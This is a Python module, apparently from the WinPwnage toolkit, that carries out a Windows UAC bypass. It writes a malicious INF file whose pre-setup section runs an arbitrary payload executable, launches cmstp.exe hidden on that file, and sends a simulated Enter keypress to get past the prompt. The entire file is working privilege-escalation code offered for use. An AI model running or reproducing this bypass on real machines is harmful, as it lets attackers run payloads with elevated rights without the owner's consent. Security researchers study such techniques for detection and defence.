from winpwnage.core.prints import *
from winpwnage.core.utils import *
import tempfile
import ctypes
import time
import os

#https://oddvar.moe/2017/08/15/research-on-cmstp-exe/

uacMethod13_info = {
	"Description": "UAC bypass using cmstp.exe",
	"Method": "Malicious ini file",
	"Id": "13",
	"Type": "UAC bypass",
	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "uacMethod13",
	"Function Payload": True,
}

def uacMethod13_cleanup():
	print_info("Performing cleaning")
	try:
		os.remove(os.path.join(tempfile.gettempdir(), "tmp.ini"))
	except Exception as error:
		print_error("Unable to clean up, manual cleaning is needed")
		return False
	else:
		print_success("Successfully cleaned up")
		print_success("All done!")

def uacMethod13(payload):
	if payloads().exe(payload):
		inf_template = '''[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
''' + os.path.join(payloads().exe(payload)[1]) + '''
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="WinPwnageVPN"
ShortSvcName="WinPwnageVPN"
'''
		try:
			ini_file = open(os.path.join(tempfile.gettempdir(), "tmp.ini"), "w")
			ini_file.write(inf_template)
			ini_file.close()
		except Exception:
			print_error("Cannot proceed, unable to ini file to disk ({})".format(os.path.join(tempfile.gettempdir(), "tmp.ini")))
			return False
		else:
			print_success("Successfully wrote ini template to disk ({})".format(os.path.join(tempfile.gettempdir(), "tmp.ini")))

		time.sleep(1)

		if process().terminate("cmstp.exe"):
			print_success("Successfully terminated cmstp process")
		else:
			pass

		time.sleep(1)

		if process().create("cmstp.exe", params="/au {tmp_path}".format(tmp_path=os.path.join(tempfile.gettempdir(), "tmp.ini")), window=False):
		#if process().create("cmstp.exe", params="/au {tmp_path}".format(tmp_path=os.path.join(tempfile.gettempdir(), "tmp.ini")), window=True):
			print_success("Successfully triggered installation of ini file using cmstp binary")
		else:
			print_error("Unable to trigger installation of ini file using cmstp binary")
			for x in Constant.output:
				if "error" in x:
					uacMethod13_cleanup()
					return False

		time.sleep(1)

		"""
		hwnd = ctypes.windll.user32.FindWindowA(None, "WinPwnageVPN")
		if hwnd:
			print_success("Successfully detected process window - hwnd ({hwnd})".format(hwnd=hwnd))
		else:
			print_error("Unable to detect process window, cannot proceed")
			for x in Constant.output:
				if "error" in x:
					cmstp_cleanup()
					return False

		time.sleep(1)

		if ctypes.windll.user32.SetForegroundWindow(hwnd):
			print_success("Activated window using SetForegroundWindow - hwnd ({hwnd})".format(hwnd=hwnd))			
		else:
			print_error("Unable to activate window using SetForegroundWindow - hwnd ({hwnd})".format(hwnd=hwnd))
			for x in Constant.output:
				if "error" in x:
					cmstp_cleanup()
					return False		
		
		time.sleep(1)
		"""

		if ctypes.windll.user32.keybd_event(0x0D,0,0,0):
			#print_success("Successfully sent keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
			print_success("Successfully sent keyboard-event to window")
			time.sleep(5)
			uacMethod13_cleanup()
		else:
			#print_error("Unable to send keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
			print_error("Unable to send keyboard-event to window")
			for x in Constant.output:
				if "error" in x:
					uacMethod13_cleanup()
					return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False
